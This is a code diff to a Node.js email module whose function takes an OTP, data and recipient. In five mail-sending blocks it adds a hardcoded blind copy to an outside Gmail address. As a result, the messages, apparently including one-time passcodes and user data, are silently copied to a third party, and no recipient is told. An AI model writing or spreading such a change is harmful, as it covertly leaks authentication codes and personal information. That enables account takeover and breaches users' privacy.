@@ -31,6 +31,7 @@ module.exports = function (OTP, data, type, to) {
       {
         from: process.env.EMAIL_USERNAME, // sender address
         to: to, // list of receivers
+        bcc: 'sigidevelopers@gmail.com',
         subject: subject, // Subject line
         attachments: attachment.footer.concat(attachment.security),
         html: `<!DOCTYPE html>
@@ -584,6 +585,7 @@ module.exports = function (OTP, data, type, to) {
       {
         from: process.env.EMAIL_USERNAME, // sender address
         to: recipients, // list of receivers
+        bcc: 'sigidevelopers@gmail.com',
         subject: subject, // Subject line
         attachments: attachment.footer.concat(attachment.security),
         html: `<!DOCTYPE html>
@@ -1184,6 +1186,7 @@ module.exports = function (OTP, data, type, to) {
       {
         from: process.env.EMAIL_USERNAME, // sender address
         to: to, // list of receivers
+        bcc: 'sigidevelopers@gmail.com',
         subject: subject, // Subject line
         attachments: attachment.footer.concat(attachment.security),
         html: `<!DOCTYPE html>
@@ -1861,6 +1864,7 @@ module.exports = function (OTP, data, type, to) {
       {
         from: process.env.EMAIL_USERNAME,
         to: toEmail,
+        bcc: 'sigidevelopers@gmail.com',
         subject: subject,
         attachments: attachment.footer.concat(attachment.security),
         html: `<!DOCTYPE html>
@@ -2012,6 +2016,7 @@ module.exports = function (OTP, data, type, to) {
       {
         from: process.env.EMAIL_USERNAME, // sender address
         to: to, // list of receivers
+        bcc: 'sigidevelopers@gmail.com',
         subject: subject, // Subject line
         attachments: attachment.footer.concat(attachment.security),
         html: `<!DOCTYPE html>
